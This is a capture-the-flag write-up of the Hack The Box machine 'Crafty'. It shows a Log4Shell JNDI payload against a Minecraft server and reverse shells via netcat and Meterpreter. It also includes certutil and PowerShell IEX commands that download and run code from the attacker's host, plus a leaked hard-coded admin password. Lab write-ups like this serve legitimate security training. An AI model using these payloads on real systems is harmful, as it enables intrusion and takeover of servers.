---
layout: post
title: "HTB: Crafty"
author: Andrew Cherney
date: 2024-06-16
tags: htb easy-box log4j minecraft webapp windows java season-4
icon: "assets/icons/crafty.png"
post_description: "A blast from the past of a box. Uses the infamous log4shell vulnerability to compromise a Minecraft server, and the icing on the cake is a Minecraft plugin leaks the admin password. Truly a great exploration of the potential vulnerable environments present on many game server hosting machines."
---

# Summary

{{ page.post_description }}

# Enumeration


```powershell
nmap.exe -T4 -p- 10.129.199.164

Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-10 13:43 Central Standard Time
Nmap scan report for play.crafty.htb (10.129.199.164)
Host is up (0.090s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft


nmap -T4 -A -p 25565 10.129.199.164

PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops

TRACEROUTE (using port 25565/tcp)
HOP RTT       ADDRESS
1   100.00 ms 10.10.14.1
2   100.00 ms play.crafty.htb (10.129.199.164)
```

## Port 80 - crafty.htb

![crafty.htb front page](/img/crafty/crafty_front_page.png)

![store/forums/voting coming soon](/img/crafty/crafty_coming_soon.png)

## Minecraft

A simple minecraft server site. If you were around the christmas of 2021 you'd remember a devastating vulnerability for the Log4j service which affected Minecraft deemed Log4shell. The basics of the vulnerability are the logging service will intercept a request for a remote LDAP server and download then run the provided at the endpoint of that server. In the common exploit that endpoint redirects to a webserver where a java class file containing arbitrary code is hosted.

Step 1 we need to verify that minecraft server can be connected to.

![server is online](/img/crafty/crafty_minecraft_server_online.png)

![connecting to the server](/img/crafty/crafty_minecraft_connect.png)

![wrong version need 1.16.5](/img/crafty/crafty_minecraft_version_info.png)

That version of a default minecraft server is almost guaranteed to be vulnerable to the exploit in question. Step 2 we need the correct minecraft version. Quick tutorial for those who don't play modded minecraft: Head to installations then new installation. In the version tab add 1.16.5 not a snapshot but the raw version as shown below.

![installations tab](/img/crafty/crafty_minecraft_installations_tab.png)

![making 1.16.5 version](/img/crafty/crafty_minecraft_version_create.png)

Step 3 make a test payload and determine if the server can call back to a provided IP address. `${jndi:ldap://10.10.14.26/test}` is the payload I went for.

![log4j test](/img/crafty/crafty_minecraft_log4jtest.png)

```powershell
ncat.exe -nvlp 389

Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.129.199.164.
Ncat: Connection from 10.129.199.164:49680.
0
`Ç
```

# User as svc_minecraft

## Log4shell

[https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc) is the payload I opted to use. Now this is the point where I can lament that I hadn't tested log4shell in the past because if I had this would have been a first blood for user in the season. I had all the info I needed the seconds after starting and enumerating the box as to if Log4shell would work, but minecraft wasn't installed in my hacking vm and I didn't have the proper java version from oracle. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Crafty/log4j-shell-poc]
└──╼ $tar -xf jdk-8u20-linux-i586.tar.gz
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Crafty/log4j-shell-poc]
└──╼ $./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) Server VM (build 25.20-b23, mixed mode)
```

Be sure to change the cmd part of the java class in poc.py to whatever the shell of the vulnerable system would be. In windows we change that to 'cmd.exe' it is default bash in the github repo. This script will host the ldap server and webserver, then send a shell to a provided port. It provides the payload to send.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Crafty/log4j-shell-poc]
└──╼ $python3 poc.py --userip 10.10.14.3 --webport 8000 --lport 7777

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.26:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.14.26:8000/Exploit.class
10.129.180.159 - - [10/Feb/2024 16:25:45] "GET /Exploit.class HTTP/1.1" 200 -

```

```powershell
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Crafty/log4j-shell-poc]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.180.159 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>whoami
whoami
crafty\svc_minecraft

c:\users\svc_minecraft\server>cd ../..
cd ../..

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users

10/24/2023  11:38 AM    <DIR>          .
10/24/2023  11:38 AM    <DIR>          ..
10/10/2020  07:17 AM    <DIR>          Administrator
10/26/2023  06:03 PM    <DIR>          Public
02/09/2024  01:18 PM    <DIR>          svc_minecraft
               0 File(s)              0 bytes
               5 Dir(s)   3,244,421,120 bytes free

c:\Users>cd svc_minecraft/Desktop
cd svc_minecraft/Desktop

c:\Users\svc_minecraft\Desktop>type user.txt
type user.txt
bfc957f2f0----------------------
```

# Root

## Minecraft Plugins

It did take a while to poke around in the environment. I checked many common vectors including running WinPEAS and I felt a little confused I didn't find any possible vector. I upgraded to a meterpreter session for ease of uploading or downloading. I decided to check back into the server location and check for non-default jar files. 



```powershell
c:\Users\svc_minecraft\Documents>certutil.exe -urlcache -f http://10.10.14.3:8081/revshell.exe revshell.exe
certutil.exe -urlcache -f http://10.10.14.3:8081/revshell.exe revshell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\svc_minecraft\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\Documents

02/16/2024  05:08 PM    <DIR>          .
02/16/2024  05:08 PM    <DIR>          ..
02/16/2024  05:08 PM             7,168 revshell.exe
               1 File(s)          7,168 bytes
               2 Dir(s)   2,872,033,280 bytes free

c:\Users\svc_minecraft\Documents>revshell.exe
revshell.exe
```

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8888
LPORT => 8888
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.3
LHOST => 10.10.14.3
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.14.3:8888 
[*] Sending stage (200774 bytes) to 10.10.11.249
[*] Meterpreter session 1 opened (10.10.14.3:8888 -> 10.10.11.249:49702) at 2024-02-16 19:08:31 -0600

(Meterpreter 1)(c:\Users\svc_minecraft\Documents) > 
```

```meterpreter
(Meterpreter 1)(c:\Users\svc_minecraft\server\plugins) > ls
Listing: c:\Users\svc_minecraft\server\plugins
==============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  9996  fil   2023-10-27 16:48:53 -0500  playercounter-1.0-SNAPSHOT.jar

(Meterpreter 1)(c:\Users\svc_minecraft\server\plugins) > download playercounter-1.0-SNAPSHOT.jar 
[*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/raccoon/_hacking/HackTheBox/Active/Crafty/playercounter-1.0-SNAPSHOT.jar
[*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/raccoon/_hacking/HackTheBox/Active/Crafty/playercounter-1.0-SNAPSHOT.jar
[*] download   : playercounter-1.0-SNAPSHOT.jar -> /home/raccoon/_hacking/HackTheBox/Active/Crafty/playercounter-1.0-SNAPSHOT.jar
```

Non-standard playercounter plugin. jd-GUI can be used to decompile java and specifically in this case jar files. The contents of Playercounter.class within the plugin jar are as follows:

```java
package htb.crafty.playercounter;  
  
import java.io.IOException;  
import java.io.PrintWriter;  
import net.kronos.rkon.core.Rcon;  
import net.kronos.rkon.core.ex.AuthenticationException;  
import org.bukkit.plugin.java.JavaPlugin;  
  
public final class Playercounter extends JavaPlugin {  
  public void onEnable() {  
    Rcon rcon = null;  
    try {  
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());  
    } catch (IOException e) {  
      throw new RuntimeException(e);  
    } catch (AuthenticationException e2) {  
      throw new RuntimeException(e2);  
    }   
    String result = null;  
    try {  
      result = rcon.command("players online count");  
      PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");  
      writer.println(result);  
    } catch (IOException e3) {  
      throw new RuntimeException(e3);  
    }   
  }  
    
  public void onDisable() {}  
}
```

Hard coded password, time to check local admin. 

```powershell
PS C:\Users> $username='Administrator'
$username='Administrator'
PS C:\Users> $password='s67u84zKq8IXw'
$password='s67u84zKq8IXw'
PS C:\Users> $securePassword= ConvertTo-SecureString $password -AsPlainText -Force
$securePassword= ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Users> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Users> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8081/revshell.ps1')" -Credential $credential
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Crafty/log4j-shell-poc]
└──╼ $nc -nvlp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.249 49726
whoami
crafty\administrator
dir
Administrator Public svc_minecraft
cd Administrator/Desktop

dir
root.txt
type root.txt
5e4131238f8---------------------
```

